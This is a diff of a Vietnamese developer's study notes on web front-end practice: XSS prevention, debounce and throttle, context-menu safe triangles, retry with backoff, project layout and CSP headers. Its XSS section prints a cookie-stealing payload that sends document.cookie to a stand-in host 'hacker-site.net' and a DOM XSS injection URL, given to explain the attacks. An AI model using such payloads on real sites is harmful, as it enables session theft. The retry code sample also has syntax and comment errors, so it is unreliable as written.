@@ -1,13 +1,11 @@
-# Cách kiểu tấn công XSS
-innterHTML thì ngừoi dùng có thể input code js nguy hiểm, dùng textContent có thể tránh được.
-innerHTML có thể bị XSS nên React đã đổi thành dangerouslySetInnerHTML và khuyên k nên dùng. VD: <div dangerouslySetInnerHTML={{ __html: htmlContent }} />
-Tương tự thuộc tính href thẻ a cũng k an toàn. Khuyên dùng encodeURIComponent để chuyển ký tự đặc biệt thành html entity trước
+# XSS
+->*** Cách tránh khi input của người dùng hiển thị trên UI:
+- Dùng textContent thay vì innerHTML là xong. innerHTML có thể bị XSS nên React đã đổi thành dangerouslySetInnerHTML, k nên dùng. 
+- Input nhét vào url phải dùng encodeURIComponent để chuyển ký tự đặc biệt thành html entity trước là xong.
 
--> Reflected XSS
-User login 1 trang web sẽ có session cookies -> Hacker gửi cho người dùng 1 URL tới trang web đó nhưng tham số có chứa mã XSS -> người dùng truy cập vào URL đó thì gửi request tới server với mã XSS của hacker -> server xử lý và trả lại ngừoi dùng hiển thị ra màn hình. VD đoạn mã là: var i=new Image; i.src=”http://hacker-site.net/”+document.cookie; -> Browser hiển thị ra màn hình sẽ thực hiện script và gửi session cookie cho hacker.
+-> Reflected XSS: User login web có session cookies -> Hacker gửi 1 URL tới trang web đó nhưng tham số có chứa mã XSS -> người dùng truy cập vào URL đó thì gửi request tới server với mã XSS của hacker -> server xử lý và trả lại ngừoi dùng hiển thị ra màn hình. VD đoạn mã là: var i=new Image; i.src=”http://hacker-site.net/”+document.cookie; -> Browser hiển thị ra màn hình sẽ thực hiện script và gửi session cookie cho hacker.
 
--> Stored XSS
-Hacker chèn script độc hại, server lưu vào database -> nạn nhân đăng nhập vào web như thường, lấy đoạn XSS script từ server gửi về thực thi là toang
+-> Stored XSS: Hacker chèn script độc hại, server lưu vào database -> nạn nhân đăng nhập vào web như thường, lấy data từ db có đoạn XSS script về thực thi là toang
 
 -> DOM Based XSS: giống reflected XSS nhưng 1 cái gửi lên server, 1 cái sửa DOM
 Hacker lừa người dùng truy cập vào URL của 1 trang web để đăng nhập là: http://example.com/register.php?message=Please fill in the form
@@ -17,10 +15,9 @@ Nhưng hacker lại gửi: http://example.com/register.php?message=<label>Gender
 
 
 # Dùng debounce throttle
-Có thể tự implement hoặc dùng lib như lodash
+Debounce trigger liên tục mãi mãi sẽ kbh chạy hàm, throttle đảm bảo hàm chạy luôn lần sau trigger cách lần trước đủ tg sẽ đảm bảo chạy tiếp.
 
 -> throttle: Giới hạn số lần gọi hàm trong 1 ktg. VD ta có thể set là "Bất cứ 10s liên tiếp nào cũng k có quá 1 lần gọi hàm này"
-VD: khi đổi kích thước màn hình or scroll thì chạy hàm gì đó nhưng các sự kiện đó thg được tự trigger quá nhiều, dùng throttle giảm số lần xử lý sẽ đỡ lag.
 VD: thg dung trong game khi người dùng ấn bắn chiêu nhanh đến mấy thì vẫn bắn 1s 1 phát đạn chẳng hạn
 function throttle(func, delay) {
   let lastCallTime = 0;
@@ -37,8 +34,9 @@ const throttledFunction = throttle(() => {
 }, 500);
 throttledFunction();
 
--> debounce: Delay trigger event sau một khoảng thời gian xác định kể từ lần cuối cùng hàm được gọi.
-VD: tính năng search gõ liên tục sẽ chỉ tự thực hiện search sau khi gõ xong
+-> debounce: trigger sẽ k thực hiện ngay mà delay 1 ktg kể từ lần cuối cùng hàm được gọi.
+VD: khi đổi kích thước màn hình or scroll thì chạy hàm gì đó nhưng các sự kiện đó thg được tự trigger quá nhiều, dùng debounce cho đỡ lag
+VD: tính năng search khi gõ liên tục sẽ chỉ tự thực hiện sau khi gõ xong
 function debounce(func, delay) {
   let timeoutId;
   return function (...args) {
@@ -56,30 +54,29 @@ debouncedFunction();
 
 
 # Tạo safe triangle cho context menu
-Giải thích rõ cơ chế ở: https://www.smashingmagazine.com/2023/08/better-context-menus-safe-triangles/
-Cụ thể là xử lý sự kiện mouse enter và mouse leave. Dùng toán check con chuột trong hình tam giác thì disable mouse pointer event đi là xong
-Safe triangle bên cạnh việc di chuột trong vùng, nếu chuột bị di chậm hoặc đứng yên cũng tự tắt.
+Giải thích: https://www.smashingmagazine.com/2023/08/better-context-menus-safe-triangles/
+Cơ chế xử lý sự kiện mouse enter và mouse leave. Mỗi khi move sẽ check vị trí mouse trong hình tam giác cũ thì tạo tam giác mới, ngoài hình tam giác cũ thì disable pointer-event là xong.
+Có thể implement thêm safe triangle thì chuột bị di chậm hoặc đứng yên cũng tự tắt.
 
 
 
 # Dùng retryable
-Request lỗi k nên dừng luôn và bắt user refresh trang, ta phải implement retryable. Chỉ dùng khi bị lỗi mạng và biết rằng việc retry có thể thành công. Nếu biết rằng retry request vẫn sẽ báo lỗi y như v thì nên kết thúc và show lỗi cho người dùng biết.
+BE nên dùng retryable khi call api qtr và db, đặc biệt là call by batch.
+BE call tới db cũng nên tận dùng transaction để gom batch update 1 lần.
+FE ít khi dùng retryable vì ít khi lỗi mạng, mà nếu lỗi thì call lại cũng khó thành công, thường sẽ show lỗi cho người dùng. FE chỉ nên dùng cho các API quan trọng gọi tới bên thứ 3, khi polling liên tục, khi dùng socket muốn reconnect khi mất kết nối. 
+FE retryable thường triển khai qua interceptors của axios.
 
-K nên retry liên tục vô hạn mà phải sleep 3s rồi retry max 5 lần chẳng hạn. Chưa tốt vì nếu nhiều người dùng cùng lúc, tự dưng sập và mọi request tại thời điểm đó bị lỗi và retry đồng thời mỗi 3s, thì kể từ đó, mỗi 3s thì số lượng request trùng lặp dần tăng lên trong 5 lần kế. Vì 3s sau lại có người mới vào, 6s sau lại có người mới vào.
-=> Giải pháp là cộng thêm 1 số random cho khoảng thời gian sleep là được. 
-
-K nên retry mỗi 3s vì trong khoảng thời gian ngắn, xác suất request gặp lại lỗi cũ rất cao. Giải pháp exponential backoff là các lần sau request sẽ phải chờ lâu hơn các lần trước. Nó xuất hiện trong các pp nhập mật khẩu, VD nhập sai càng nhiều sẽ chờ càng lâu hơn lần trước đó.
+Nên giới hạn retry 3s max 5 lần. Chưa tốt vì nếu nhiều người dùng cùng lúc, tự dưng sập và mọi request tại thời điểm đó bị lỗi và retry đồng thời mỗi 3s, thì kể từ đó, mỗi 3s thì số lượng request trùng lặp dần tăng lên trong 5 lần kế.
+Giải pháp là cộng thêm 1 số random ở mỗi lần để sleep. Chưa tốt vì ktg ngắn thì xs lặp lại lỗi cũ cao, phải dùng exponential backoff là các lần sau request sẽ phải chờ lâu hơn các lần trước. VD khi nhập mật khẩu, nhập sai càng nhiều sẽ chờ càng lâu hơn lần trước đó.
 
 VD càng sai càng chờ lâu, liên tục trong 3 lần, cộng 1 khoảng random từ 0->1s:
 static async fetchWithRetry(url, errorCount = 0) => {
   const ERROR_COUNT_MAX = 3;
   const response = await fetch(url);
-  if(response.status < 200 || response.status >= 300) {
+  if(response.status < 200 || response.status >= 300) { // Chỉ lỗi mạng mới retry
     // Log lỗi 
     if(errorCount < ERROR_COUNT_MAX){
-      await new Promise(r => setTimeout(r, 
-        Math.pow(2, errorCount)*3000 + Math.random()*1000
-      ));
+      await new Promise(r => setTimeout(r, Math.pow(2, errorCount)*3000 + Math.random()*1000));
       await this.fetchWithRetry(url, errorCount + 1);
     }
   }
@@ -90,7 +87,8 @@ static async fetchWithRetry(url, errorCount = 0) => {
 # Chia cấu trúc dự án lớn
 Quan trọng là nhìn vào giao diện biết tìm ở file nào, nhìn vào file nào biết nằm ở đâu trên giao diện. 1 người mới toanh nhìn vào là hiểu luôn.
 VD ta cần tìm trong trang finance, trong 1 mục X, có cái dropdown => Phải tìm trong pages/finance/X/index.js. Dropdown là 1 component chung nhưng chỉ dùng ở finance thì nên chia kiểu src/common/finance/dropdown/index.js hoặc src/apps/finance/common/dropdown/index.js
-VD chia theo chức năng, mỗi chức năng sẽ chia theo cấu trúc từng module UI, vừa tìm dễ trên UI, vừa tìm dễ trong code:
+
+VD chuẩn là chia theo chức năng, mỗi chức năng sẽ chia theo cấu trúc từng module UI:
 src (folder)
   api (folder)
     calling (folder) => call API cho calling
@@ -98,9 +96,9 @@ src (folder)
     helpers (folder) => enum, utility liên quan tới API
   app (folder)
     common (folder) => common component
-    structure (folder) => component kiểu loading, error, headers, router
-    pages (folder)
-      calling (folder)
+    structure (folder) => component kiểu loading, error, headers, router => chức năng
+    pages (folder) => chức năng
+      calling (folder) => module UI
         common (folder) => common components của calling
         callingpolicy => component trong calling policy. Chia theo cấu trúc UI
         callqueues => component trong callqueues
@@ -124,14 +122,12 @@ src (folder)
   context (folder)
   index.html
   index.js
-=> Nếu vì ít file mà k chia folder của module thì nên đặt prefix trong tên file là tên module để có 2 chiều: 1 là nhìn file biết module nào luôn và 2 là nhìn module có chức năng nào thì biết tìm file ở đâu luôn. Còn TH lớn mới chia module ở bên trong chức năng như trên.
-
-Trong 1 file component: propsType  defaultProps  utilities  Component
-
-Còn có kiểu chia là: 1 phát viết toàn module theo UI, bên trong từng module sẽ chia ra assets, common, utils, hooks, context, views, api. Chung thì để ngoài cùng luôn => K nên, sẽ ra sao nếu 1 pages lớn có 10 pages lớn khác bên trong. Lại chia phân cấp nữa thì rất mệt
+=> Với dự án nhỏ thì có thể k cần chia folder lớn cho từng module như v mà chỉ có 1 file, thì file nên có tên module để nhìn phát biết dùng cho module nào, hoặc viết 1 file common dùng cho mọi module.
+Trong 1 file component có: propsType  defaultProps  utilities  Component
 
 
 
+//!!!!!!!
 # Dựng server nodejs serve react app
 Giả sử công ty lớn cần thêm các header bảo mật khi người dùng vào web react, có thể dựng 1 server nodejs custom để serve.
 Đầu tiên build app react set outDir ra 1 thư mục có file index.html -> dựng 1 server expressjs config route để serve file index.html đó -> Tuỳ ý tạo middleware thêm các header bảo mật. Có thể tạo các biến số trong file index.html để thế vào từ server, VD các url phân tách môi trường, SSL key, login SSO -> thay lệnh chạy react bằng lệnh chạy nodejs.
@@ -150,11 +146,4 @@ form-action 'self' .online15.net: Chỉ định các nguồn mà biểu mẫu c�
 script-src 'self' 'nonce-{req.nonce}' .online15.net .aptrinsic.com: Cho phép chạy script từ cùng một nguồn và từ các miền cụ thể, với điều kiện rằng script có nonce (một giá trị duy nhất cho mỗi yêu cầu) để ngăn chặn việc chèn script độc hại. Thẻ script trong dự án phải có thêm trường nonce
 connect-src .sharepointguild.com .online15.net .aptrinsic.com .segment.com .segment.io 'self': Chỉ định các nguồn mà trang có thể thực hiện các kết nối (như WebSocket, AJAX).
 
-
-
-# Tìm best url trong list url
-VD có 1 list rpc như nhau, cần chọn ra best url để gọi vào, rpc có thể chết bất cứ lúc nào.
-=> Mỗi khi user vào trang web sẽ query thử 1 lệnh đơn giản (như getBlockNumber) cả list rpc với Promise.any xem cái nào trả nhanh nhất thì lấy
-Nếu có lỗi mạng thì sẽ tự chọn second-best url query lại, khi refresh lại pages sẽ chọn lại url luôn.
-=> ref tới projects "Vatra"
-
+upgrade-insecure-requests
